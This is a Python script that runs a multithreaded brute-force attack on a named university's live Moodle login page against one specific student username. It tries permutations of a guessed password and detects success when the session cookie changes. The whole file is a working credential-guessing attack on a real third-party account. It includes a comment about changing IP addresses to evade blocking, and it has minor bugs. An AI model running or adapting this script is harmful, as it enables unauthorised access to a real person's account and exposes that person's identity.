import requests
import itertools
import time
import threading
from queue import Queue
import sys
import os
#---------------

#Global Variables
url="https://moodle.niituniversity.in/moodle/login/index.php"
user="chowdavarapu.sriker"
combinations=8*8*8*8*8*8*8*8
res = itertools.permutations('srikar1.',8)
count=0

#File Object
f=open("password.txt","w+")

#Queue Object
q = Queue()

#Print_lock
print_lock=threading.Lock()

#Threader Function
def threader():
    while True:
        combination=q.get()
        passwordCracker(combination)
        q.task_done

#passwordCracker Function
def passwordCracker(combination):
    try:
        s=requests.Session()
        r=s.get(url)
        session1=r.cookies["MoodleSession"]
        pas="".join(combination)
        login_data=dict(username=user,password=pas)
        s.post(url,data=login_data)
        session2=s.cookies["MoodleSession"]
        for fake in range(1):
            if session1!=session2:
                with print_lock:
                    print("PASSWORD FOUND - " + str(pas))
                    break
            else:
                with print_lock:
                    print(str(pas)  + "  not Match")
    except Exception:
        print("\n----" + str(Exception) + "-------\n")
        print("\nChanging IP Address\n")
        time.sleep(5)

#Creating Threads
for thread in range(4):
    th = threading.Thread(target=threader)
    th.daemon = True
    th.start()

#putting the res values in to the Queue
for eachCombination in res:
    q.put(eachCombination)
q.join()
